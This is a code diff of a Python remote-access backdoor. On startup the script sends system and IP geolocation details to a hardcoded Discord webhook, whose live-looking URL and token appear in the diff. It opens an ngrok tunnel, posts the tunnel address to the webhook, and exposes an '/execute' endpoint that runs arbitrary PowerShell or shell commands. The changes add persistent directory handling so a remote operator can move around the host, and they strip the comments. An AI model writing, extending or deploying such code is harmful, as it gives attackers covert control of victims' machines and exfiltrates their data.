@@ -16,21 +16,23 @@ if platform.system() == 'Linux':
     os.system("clear")
 else:
     os.system("cls")
-username = "swiftfoxerwindows2"  # Default username
+
+username = "SwiftFox46"
 hook_url = "https://discord.com/api/webhooks/1283829399132573798/BQYGDwoOEfz7_PC1eSzmqO8BmkbAZwm0RmRgAXTC7Uisq3E4u2w5CMSaxkiF3Jeh0fBM"
 hook = Webhook(hook_url)
+
+current_directory = os.getcwd()
 
 def start_ngrok():
     ngrok_process = subprocess.Popen(['ngrok', 'http', '8080'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     hook.send("Waiting for ngrok to start...")
     time.sleep(10)
 
-    # Get the public URL using ngrok's API
     try:
         response = requests.get('http://localhost:4040/api/tunnels')
         tunnels = response.json().get('tunnels', [])
         if tunnels:
-            public_url = tunnels[0]['public_url']  # Get the first tunnel's public URL
+            public_url = tunnels[0]['public_url']
             hook.send(f"Ngrok public URL: {public_url}")
             hook.send(f"```json\n{public_url}\n```")
             return public_url, ngrok_process
@@ -43,7 +45,6 @@ def start_ngrok():
         ngrok_process.terminate()
         return None, ngrok_process
 
-# Function to gather system information
 def gather_system_info():
     response = requests.get("http://ip-api.com/json/?fields=61439")
     ip_data = response.json()
@@ -62,31 +63,37 @@ def gather_system_info():
         "Local IP": local_ip
     }
     
-    # Send gathered data to Discord
     hook.send(f"```json\n{json.dumps(system_info, indent=4)}\n```")
     hook.send(f"```json\n{json.dumps(ip_data, indent=4)}\n```")
     return public_ip, ip_data, system_info
 
-# Gather and send system information at startup
 gather_system_info()
-
-# Start ngrok and get the public URL
 ngrok_url, ngrok_process = start_ngrok()
 time.sleep(5)
 
 @app.route('/execute', methods=['POST'])
 def execute_command():
     data = request.get_json()
-    command = data.get('command', '')  # Get the command from the request data
-    
+    command = data.get('command', '')
+
+    global current_directory
+
     try:
-        # Detect OS and choose the appropriate shell for command execution
+        if command.lower().startswith("cd "):
+            new_dir = command.split(" ", 1)[1]
+            try:
+                os.chdir(new_dir)
+                current_directory = os.getcwd()
+                return jsonify({'result': f"Changed directory to {current_directory}"})
+            except FileNotFoundError:
+                return jsonify({'error': f"No such file or directory: '{new_dir}'"}), 404
+            except PermissionError:
+                return jsonify({'error': f"Permission denied: '{new_dir}'"}), 403
+
         if platform.system() == 'Windows':
-            # Execute with PowerShell by default
-            result = subprocess.run(['powershell', '-Command', command], capture_output=True, text=True)
+            result = subprocess.run(['powershell', '-Command', command], capture_output=True, text=True, cwd=current_directory)
         else:
-            # Execute with Bash for Linux/macOS
-            result = subprocess.run(command, shell=True, capture_output=True, text=True)
+            result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=current_directory)
         
         output = result.stdout if result.returncode == 0 else result.stderr
         return jsonify({'result': output})
@@ -109,10 +116,9 @@ def get_username():
 
 def cleanup(signum, frame):
     hook.send("Shutting down gracefully...")
-    ngrok_process.terminate()  # Terminate ngrok process
+    ngrok_process.terminate()
     sys.exit(0)
 
-# Handle SIGINT and SIGTERM for graceful shutdown
 signal.signal(signal.SIGINT, cleanup)
 signal.signal(signal.SIGTERM, cleanup)
 
